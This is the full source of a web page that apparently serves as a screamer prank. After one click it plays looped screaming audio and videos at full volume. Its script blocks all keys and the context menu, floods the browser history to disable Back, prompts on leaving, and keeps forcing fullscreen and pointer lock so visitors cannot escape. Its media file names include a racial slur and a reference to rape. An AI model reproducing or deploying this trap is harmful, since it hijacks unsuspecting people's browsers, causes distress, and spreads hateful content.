<html>
<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-149452514-1"></script>

  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}

<link rel="stylesheet" type="text/css" href="styles.css">

<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<style>
* { 
    padding: 0; 
    margin: 0; 
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

body, html {
    overflow: hidden;
    height: 100%;
    width: 100%;
    background: #000;
    cursor: none;
}

.video-container {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 1280px;
    height: 480px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    z-index: 1000;
}

.video-wrapper {
    width: 640px;
    height: 480px;
    position: relative;
}

#fart, #ronnie {
    width: 100%;
    height: 100%;
    object-fit: contain;
    position: absolute;
    top: 0;
}

#fart { left: 0; }
#ronnie { right: 0; }

.video-divider {
    width: 2px;
    height: 480px;
    background: red;
    position: absolute;
    left: 50%;
    transform: translateX(-50%);
}

.click-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999999;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
}

.click-overlay button {
    padding: 20px 40px;
    font-size: 20px;
    background: #fff;
    color: #000;
    border: none;
    border-radius: 0;
    cursor: pointer;
}

.black-screen {
    background-color: black;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999998;
}

.backg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
}

.backg img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    opacity: 0.3;
}
</style>

</head>
<body>

<div class="click-overlay">
    <button onclick="forceFullscreenAndPlay()">ENTER</button>
</div>
<div class="black-screen"></div>

<audio id="shart" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart3" preload="auto" loop src="rape.mp3"></audio>

<div class="video-container">
    <div class="video-wrapper">
        <video id="fart" loop src="zzart.mp4" playsinline></video>
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
    </div>
</div>

<div class="backg"><img src="naggars.gif"></div>

<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>
(function() {
    let hasTriggered = false;
    const ORIGINAL_WIDTH = 640;
    const ORIGINAL_HEIGHT = 480;

    // KEYBOARD LOCKDOWN: Aggressive prevention of escape keys
    document.addEventListener('keydown', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }, true);

    // CONTEXT MENU LOCKDOWN
    document.addEventListener('contextmenu', e => e.preventDefault(), true);

    // NAVIGATION LOCK: Floods history to make "Back" button useless
    function floodHistory() {
        for (let i = 0; i < 20; i++) {
            history.pushState(null, null, location.href);
        }
    }
    
    window.onpopstate = function() {
        floodHistory();
    };

    // WINDOW CLOSE PREVENTION
    window.onbeforeunload = function() {
        return "Are you sure you want to leave?";
    };

    function attemptFullscreen() {
        const elem = document.documentElement;
        if (elem.requestFullscreen) elem.requestFullscreen();
        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
        else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
        else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
    }

    window.forceFullscreenAndPlay = function() {
        hasTriggered = true;
        floodHistory();

        const overlay = document.querySelector('.click-overlay');
        const blackScreen = document.querySelector('.black-screen');
        if (overlay) overlay.style.display = 'none';
        if (blackScreen) blackScreen.style.display = 'none';
        
        const videos = [document.getElementById('fart'), document.getElementById('ronnie')];
        const audios = [
            document.getElementById('shart'),
            document.getElementById('shart2'),
            document.getElementById('shart3')
        ];
        
        // ULTRA MAX VOLUME & PLAYBACK
        const media = [...videos, ...audios];
        media.forEach(m => {
            if (m) {
                m.volume = 1.0;
                m.muted = false;
                const playPromise = m.play();
                if (playPromise !== undefined) {
                    playPromise.catch(() => {
                        // Retry loop if browser hiccups
                        setInterval(() => m.play(), 200);
                    });
                }
            }
        });
        
        // AGGRESSIVE FULLSCREEN LOOP
        attemptFullscreen();
        setInterval(attemptFullscreen, 1000);

        // POINTER LOCK: Keeps mouse trapped inside the window
        document.body.requestPointerLock = document.body.requestPointerLock || 
                                          document.body.mozRequestPointerLock || 
                                          document.body.webkitRequestPointerLock;
        document.body.requestPointerLock();
    };

    // RE-ENGAGE ON ANY CLICK (In case they manage to exit fullscreen)
    document.addEventListener('click', () => {
        if (hasTriggered) {
            attemptFullscreen();
            document.body.requestPointerLock();
        }
    });

    // RESIZE LOGIC
    function resizeVideos() {
        const videoContainer = document.querySelector('.video-container');
        if (videoContainer) {
            videoContainer.style.width = (ORIGINAL_WIDTH * 2 + 20) + 'px';
            videoContainer.style.height = ORIGINAL_HEIGHT + 'px';
        }
    }

    window.addEventListener('load', () => {
        resizeVideos();
        setInterval(resizeVideos, 2000);
    });

})();
</script>
</body>
</html>
